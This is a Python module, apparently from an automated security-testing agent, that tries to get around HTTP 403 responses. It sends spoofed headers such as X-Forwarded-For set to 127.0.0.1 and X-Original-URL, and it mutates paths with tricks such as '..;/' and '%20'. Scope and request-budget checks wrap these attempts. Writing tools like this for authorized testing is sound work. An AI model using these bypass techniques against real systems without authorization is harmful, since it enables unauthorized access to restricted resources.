"""403 Bypass engine: header manipulation, path fuzzing, method swapping."""

from __future__ import annotations

import httpx
import hashlib

from secagents.infra.execution_budget import BudgetExceeded, ExecutionBudget
from secagents.infra.scope import ScopeViolationError, enforce_scope

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-Port": "443"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Content-Length": "0"},
    {"Referer": "{url}"},
]

PATH_MUTATIONS = [
    lambda p: p + "/",
    lambda p: p + "/.",
    lambda p: p + "..;/",
    lambda p: p + "%20",
    lambda p: p + "%09",
    lambda p: "/" + p.lstrip("/").upper(),
    lambda p: p.replace("/", "//"),
]


async def bypass_403(
    url: str,
    path: str,
    client: httpx.AsyncClient | None = None,
    budget: ExecutionBudget | None = None,
) -> list[dict]:
    """Return bounded GET-only leads after confirming a 403 baseline."""
    if not path:
        return []
    enforce_scope(url)
    budget = budget or ExecutionBudget(max_requests=50, max_duration_seconds=120)

    own_client = client is None
    active_client = client or httpx.AsyncClient(verify=True, timeout=10, follow_redirects=False)

    async def scoped_get(target: str, **kwargs):
        enforce_scope(target)
        async with budget.request(target):
            return await active_client.get(target, **kwargs)

    results = []
    try:
        baseline = await scoped_get(url)
        if baseline.status_code != 403:
            return []
        baseline_hash = hashlib.sha256(baseline.content).hexdigest()
        # Header bypasses
        for header_set in BYPASS_HEADERS:
            headers = {k: v.format(path=path, url=url) for k, v in header_set.items()}
            try:
                resp = await scoped_get(url, headers=headers)
                if (
                    200 <= resp.status_code < 300
                    and hashlib.sha256(resp.content).hexdigest() != baseline_hash
                ):
                    results.append(
                        {
                            "method": "header",
                            "headers": headers,
                            "status": resp.status_code,
                            "status_label": "manual_lead",
                        }
                    )
            except (httpx.HTTPError, BudgetExceeded, ScopeViolationError):
                continue

        # Path mutations
        base = url.rsplit(path, 1)[0] if path in url else url.rstrip("/")
        for mutate in PATH_MUTATIONS:
            mutated = base + mutate(path)
            try:
                resp = await scoped_get(mutated)
                if (
                    200 <= resp.status_code < 300
                    and hashlib.sha256(resp.content).hexdigest() != baseline_hash
                ):
                    results.append(
                        {
                            "method": "path_fuzz",
                            "url": mutated,
                            "status": resp.status_code,
                            "status_label": "manual_lead",
                        }
                    )
            except (httpx.HTTPError, BudgetExceeded, ScopeViolationError):
                continue
    finally:
        if own_client:
            await active_client.aclose()

    return results
